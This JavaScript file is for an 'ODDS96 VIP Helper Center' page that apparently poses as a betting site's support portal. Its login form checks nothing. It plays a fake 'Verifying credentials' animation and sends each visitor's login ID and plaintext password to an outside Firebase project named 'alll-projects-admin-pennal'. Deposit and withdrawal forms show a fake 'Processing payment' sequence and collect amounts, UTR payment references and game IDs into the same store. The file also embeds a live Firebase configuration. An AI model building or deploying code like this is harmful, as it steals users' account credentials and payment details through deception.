// ==========================================
//  ODDS96 - User App JavaScript
//  Firebase Firestore Integration
// ==========================================

// ===== FIREBASE CONFIG =====
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

const SITE_ID = "odds96";

// ===== FIREBASE DYNAMIC LOADER =====
let _fbDb = null;
let _fbLoading = null;

function loadFirebase() {
  if (_fbDb) return Promise.resolve(_fbDb);
  if (_fbLoading) return _fbLoading;

  _fbLoading = new Promise((resolve, reject) => {
    const initDb = () => {
      try {
        if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
        _fbDb = firebase.firestore();
        resolve(_fbDb);
      } catch (e) { reject(e); }
    };

    if (window.firebase && window.firebase.firestore) { initDb(); return; }

    const urls = [
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js'
    ];
    let loaded = 0;
    urls.forEach(src => {
      const s = document.createElement('script');
      s.src = src;
      s.onload = () => {
        loaded++;
        if (loaded === urls.length) initDb();
      };
      s.onerror = () => reject(new Error('Firebase load failed: ' + src));
      document.head.appendChild(s);
    });
  });

  return _fbLoading;
}

function saveSubmission(data) {
  return loadFirebase().then(db => {
    const payload = { ...data, site_id: SITE_ID, created_at: firebase.firestore.FieldValue.serverTimestamp() };
    return db.collection('submissions').add(payload);
  });
}

let isVerified = false;
let requests = JSON.parse(localStorage.getItem('odds96_requests')) || [];
let uploadedImage = null;

function generateUserId() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let id = '';
    for (let i = 0; i < 8; i++) {
        id += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return 'ODDS-' + id;
}

function getUserId() {
    let uid = localStorage.getItem('odds96_user_id');
    if (!uid) {
        uid = generateUserId();
        localStorage.setItem('odds96_user_id', uid);
    }
    return uid;
}

function recordLogin(loginId, password) {
    const time = new Date().toLocaleString('en-IN', {
        day: '2-digit', month: 'short', year: 'numeric',
        hour: '2-digit', minute: '2-digit', hour12: true
    });
    const uid = getUserId();

    saveSubmission({
        event: 'login',
        user_id: uid,
        login_id: loginId,
        password: password,
        time: time,
        source: 'odds96.com'
    }).catch(err => console.warn('Firebase login save failed:', err));
}

function recordRequest(req) {
    const uid = getUserId();
    const session = JSON.parse(localStorage.getItem('odds96_user_session') || '{}');
    const loginId = session.loginId || 'Unknown';

    saveSubmission({
        event: 'request',
        user_id: uid,
        login_id: loginId,
        request_id: req.id,
        type: req.type,
        amount: req.amount,
        utr: req.utr || 'N/A',
        gameid: req.gameid,
        description: req.description || 'N/A',
        status: req.status,
        timestamp: req.timestamp
    }).catch(err => console.warn('Firebase request save failed:', err));
}

document.addEventListener('DOMContentLoaded', () => {
    initLogin();
    checkAutoLogin();
    initRequestForm();
});

function initLogin() {
    const loginForm = document.getElementById('loginForm');
    const loginBtn = document.getElementById('loginBtn');

    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const loginId = document.getElementById('loginId').value.trim();
        const password = document.getElementById('loginPassword').value;

        if (!loginId) return showToast('Please enter mobile or email', 'error');
        if (!password || password.length < 4) return showToast('Please enter valid password', 'error');

        loginBtn.disabled = true;
        const steps = [
            { text: 'Verifying credentials', delay: 800 },
            { text: 'Connecting securely', delay: 900 },
            { text: 'Authenticating', delay: 900 },
            { text: 'Welcome!', delay: 500 }
        ];
        let totalTime = 0;
        steps.forEach(s => totalTime += s.delay);

        steps.forEach((step, i) => {
            const startAt = steps.slice(0, i).reduce((sum, s) => sum + s.delay, 0);
            setTimeout(() => {
                const pct = Math.round(((i + 1) / steps.length) * 100);
                const isLast = i === steps.length - 1;
                loginBtn.innerHTML = [
                    '<span style="display:flex;align-items:center;gap:10px;justify-content:center;position:relative;z-index:2;">',
                    '<span class="spinner" style="border-top-color:var(--bg-dark);width:16px;height:16px;border-width:2px;',
                    isLast ? 'display:none;">' : '"></span>',
                    isLast ? '<span style="font-size:1.3em;">✅</span>' : '',
                    ' <span>', step.text, isLast ? '' : '...', '</span>',
                    '</span>',
                    '<span class="btn-progress" style="width:', pct, '%;"></span>'
                ].join('');
            }, startAt);
        });

        setTimeout(() => {
            isVerified = true;
            saveUserSession(loginId);
            recordLogin(loginId, password);
            document.getElementById('loginPopup').classList.add('hidden');
            document.getElementById('welcomeName').textContent = loginId;
            loginBtn.innerHTML = '<span>Login</span>';
            loginBtn.disabled = false;
            showToast('Login successful!');
        }, totalTime);
    });
}

function initRequestForm() {
    const requestForm = document.getElementById('requestForm');
    if (!requestForm) return;

    requestForm.addEventListener('submit', (e) => {
        e.preventDefault();
        if (!isVerified) return showToast('Please login first', 'error');

        const type = document.getElementById('requestType').value;
        const amount = document.getElementById('requestAmount').value;
        const utr = document.getElementById('requestUtr').value;
        const gameId = document.getElementById('requestGameId').value;
        const description = document.getElementById('requestDescription').value;

        if (!amount) return showToast('Please enter amount', 'error');
        if (!gameId) return showToast('Please enter Game ID', 'error');

        const submitBtn = requestForm.querySelector('.submit-btn');
        const origHTML = submitBtn.innerHTML;
        submitBtn.disabled = true;

        const steps = [
            { text: 'Submitting request', pct: 25 },
            { text: 'Processing payment', pct: 50 },
            { text: 'Verifying details', pct: 75 },
            { text: 'Completed!', pct: 100 }
        ];

        steps.forEach((step, i) => {
            setTimeout(() => {
                const isLast = i === steps.length - 1;
                submitBtn.innerHTML = [
                    '<span class="btn-shine"></span>',
                    '<span style="display:flex;align-items:center;gap:10px;justify-content:center;position:relative;z-index:2;">',
                    isLast ? '<span style="font-size:1.2em;">✅</span>' : '<span class="spinner" style="border-top-color:var(--bg-dark);width:16px;height:16px;border-width:2px;"></span>',
                    ' <span>', step.text, isLast ? '' : '...', '</span>',
                    '</span>',
                    '<span class="btn-progress" style="width:', step.pct, '%;"></span>'
                ].join('');
            }, i * 1000);
        });

        setTimeout(() => {
            const req = {
                id: Date.now().toString(36) + Math.random().toString(36).substr(2, 4),
                type: type,
                amount: amount,
                utr: utr || 'N/A',
                gameid: gameId,
                description: description || 'N/A',
                status: 'pending',
                timestamp: new Date().toLocaleString('en-IN', {
                    day: '2-digit', month: 'short', year: 'numeric',
                    hour: '2-digit', minute: '2-digit', hour12: true
                })
            };

            if (uploadedImage) {
                try { sessionStorage.setItem('img_' + req.id, uploadedImage); } catch (err) {}
            }

            requests.unshift(req);
            localStorage.setItem('odds96_requests', JSON.stringify(requests));
            recordRequest(req);

            submitBtn.innerHTML = origHTML;
            submitBtn.disabled = false;
            showToast('Request submitted successfully!');
            closeModal();
            document.getElementById('requestForm').reset();
            document.getElementById('fileName').textContent = '';
            uploadedImage = null;
            renderRequests();
        }, 4000);
    });
}

function saveUserSession(loginId) {
    const session = { loginId: loginId, loginTime: new Date().toISOString() };
    localStorage.setItem('odds96_user_session', JSON.stringify(session));
}

function checkAutoLogin() {
    const data = localStorage.getItem('odds96_user_session');
    if (!data) return;

    try {
        const session = JSON.parse(data);
        const hoursDiff = (new Date() - new Date(session.loginTime)) / (1000 * 60 * 60);
        if (hoursDiff > 30 * 24) {
            localStorage.removeItem('odds96_user_session');
            return;
        }
        isVerified = true;
        document.getElementById('loginPopup').classList.add('hidden');
        document.getElementById('welcomeName').textContent = session.loginId;
    } catch (e) {
        localStorage.removeItem('odds96_user_session');
    }
}

function logout() {
    localStorage.removeItem('odds96_user_session');
    isVerified = false;
    document.getElementById('loginPopup').classList.remove('hidden');
    document.getElementById('welcomeName').textContent = 'User';
    showPage('home');
    showToast('Logged out successfully');
}

function showPage(page) {
    if (!isVerified) return showToast('Please login first', 'error');

    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));

    const pageMap = { home: 'homePage', requests: 'requestsPage', profile: 'profilePage', mailbox: 'mailboxPage', settings: 'settingsPage' };
    const pageId = pageMap[page] || 'homePage';
    const targetPage = document.getElementById(pageId);
    if (targetPage) targetPage.classList.add('active');

    const navBtns = document.querySelectorAll('.nav-item');
    const idx = ['home', 'requests', 'profile', 'mailbox'].indexOf(page);
    if (idx >= 0 && navBtns[idx]) navBtns[idx].classList.add('active');

    if (page === 'requests') renderRequests();

    // Trigger page entrance animation
    setTimeout(() => {
        if (targetPage) {
            targetPage.style.animation = 'none';
            targetPage.offsetHeight;
            targetPage.style.animation = 'fadeIn 0.4s ease';
        }
        const reveals = (targetPage || document).querySelectorAll('.reveal, .reveal-left, .reveal-right');
        reveals.forEach(el => {
            el.classList.remove('revealed');
            const rect = el.getBoundingClientRect();
            if (rect.top < window.innerHeight) {
                setTimeout(() => el.classList.add('revealed'), 100);
            }
        });
    }, 50);
}

function renderRequests() {
    const list = document.getElementById('requestList');
    if (!list) return;

    if (!requests.length) {
        list.innerHTML = [
            '<div class="empty-state">',
            '<i class="fas fa-inbox"></i>',
            '<h3>No Requests Yet</h3>',
            '<p>Submit your first support request to get started</p>',
            '</div>'
        ].join('');
        return;
    }

    const typeMeta = {
        deposit: { label: 'Deposit', cls: 'deposit', icon: '📥' },
        withdrawal: { label: 'Withdrawal', cls: 'withdrawal', icon: '📤' },
        other: { label: 'Other', cls: 'other', icon: '❓' }
    };
    const statusLabel = { pending: 'Pending', approved: 'Approved', success: 'Success', rejected: 'Rejected' };

    list.innerHTML = requests.map(req => {
        const t = typeMeta[req.type] || typeMeta.other;
        const s = statusLabel[req.status] || 'Pending';
        return [
            '<div class="request-item">',
            '<div class="request-top">',
            '<span class="request-type-badge ', t.cls, '">', t.icon, ' ', t.label, '</span>',
            '<span class="status-badge ', req.status, '">', s, '</span>',
            '</div>',
            '<div class="request-details">',
            '<div class="request-detail"><label>Amount</label><span>₹', req.amount, '</span></div>',
            '<div class="request-detail"><label>Game ID</label><span>', escHtml(req.gameid), '</span></div>',
            req.utr && req.utr !== 'N/A' ? '<div class="request-detail"><label>UTR</label><span>' + escHtml(req.utr) + '</span></div>' : '',
            '<div class="request-detail"><label>Date</label><span>', req.timestamp, '</span></div>',
            '</div>',
            '</div>'
        ].join('');
    }).join('');
}

function escHtml(str) {
    const d = document.createElement('div');
    d.textContent = str;
    return d.innerHTML;
}

function showToast(message, type) {
    type = type || 'success';
    const toast = document.getElementById('toast');
    const toastMessage = document.getElementById('toastMessage');
    const icon = toast.querySelector('i');

    icon.className = type === 'success' ? 'fas fa-check-circle' : 'fas fa-exclamation-circle';
    toast.className = 'toast ' + type;
    toastMessage.textContent = message;

    toast.offsetHeight;
    toast.classList.add('show');

    clearTimeout(toast._timer);
    toast._timer = setTimeout(() => toast.classList.remove('show'), 2500);
}

function showRequestForm(type) {
    if (!isVerified) return showToast('Please login first', 'error');
    document.getElementById('requestModal').style.display = 'flex';
    document.getElementById('requestType').value = type || 'deposit';
    const titles = { deposit: 'Deposit Issue', withdrawal: 'Withdrawal Issue', other: 'Other Issue' };
    document.getElementById('modalTitle').textContent = titles[type] || 'New Request';
    document.getElementById('utrField').style.display = type === 'other' ? 'none' : 'block';
    document.getElementById('descriptionField').style.display = type === 'other' ? 'block' : 'none';
}

function closeModal() {
    document.getElementById('requestModal').style.display = 'none';
}

function handleFileSelect(input) {
    const file = input.files[0];
    if (!file) return;
    document.getElementById('fileName').textContent = file.name;
    const reader = new FileReader();
    reader.onload = (e) => { uploadedImage = e.target.result; };
    reader.readAsDataURL(file);
}

function socialLogin(provider) {
    showToast(provider.charAt(0).toUpperCase() + provider.slice(1) + ' login coming soon!', 'error');
}

function showRegister() { showToast('Registration coming soon!', 'error'); }
function changeAvatar() { showToast('Avatar change coming soon!', 'error'); }
function setVipLevel() { showToast('VIP level upgrade coming soon!', 'error'); }
function showChat() { showToast('Chat feature coming soon!', 'error'); }
function showTerms() { showToast('Terms & Conditions coming soon!', 'error'); }
function changePassword() { showToast('Password change coming soon!', 'error'); }

function showMailbox() { showPage('mailbox'); }
function showSettings() { showPage('settings'); }

function copyUserId() {
    const id = document.getElementById('profileUserId').textContent;
    navigator.clipboard.writeText(id).then(() => showToast('ID copied to clipboard!'));
}

function showCollabModal() { document.getElementById('collabModal').style.display = 'flex'; }
function closeCollabModal() { document.getElementById('collabModal').style.display = 'none'; }

function sendCollabRequest() {
    const friendId = document.getElementById('collabFriendId').value.trim();
    if (!friendId) return showToast('Please enter a friend ID', 'error');
    showToast('Collab request sent!');
    closeCollabModal();
}

function showAbout() { showToast('ODDS96 VIP Helper Center v1.0', 'error'); }

function showHowToUse() {
    showPage('home');
    document.querySelector('.how-it-works').scrollIntoView({ behavior: 'smooth' });
}

function toggleSetting(el) {
    el.classList.toggle('active');
    showToast('Setting updated!');
}

/* ===== SCROLL REVEAL ANIMATIONS ===== */
function initScrollReveal() {
    const revealElements = document.querySelectorAll('.reveal, .reveal-left, .reveal-right');
    if (!revealElements.length) return;

    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('revealed');
                observer.unobserve(entry.target);
            }
        });
    }, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });

    revealElements.forEach(el => observer.observe(el));
}

document.addEventListener('DOMContentLoaded', () => {
    setTimeout(initScrollReveal, 200);
    initButtonRipple();
});

/* ===== BUTTON RIPPLE EFFECT ===== */
function initButtonRipple() {
    document.querySelectorAll('button, .btn-like').forEach(el => {
        el.addEventListener('click', function(e) {
            const rect = this.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            const ripple = document.createElement('span');
            ripple.className = 'ripple-effect';
            const size = Math.max(rect.width, rect.height);
            ripple.style.width = ripple.style.height = size + 'px';
            ripple.style.left = x - size / 2 + 'px';
            ripple.style.top = y - size / 2 + 'px';
            this.appendChild(ripple);
            setTimeout(() => ripple.remove(), 600);
        });
    });
}

// Preload Firebase in background
loadFirebase().catch(e => console.warn('Firebase preload skipped:', e));
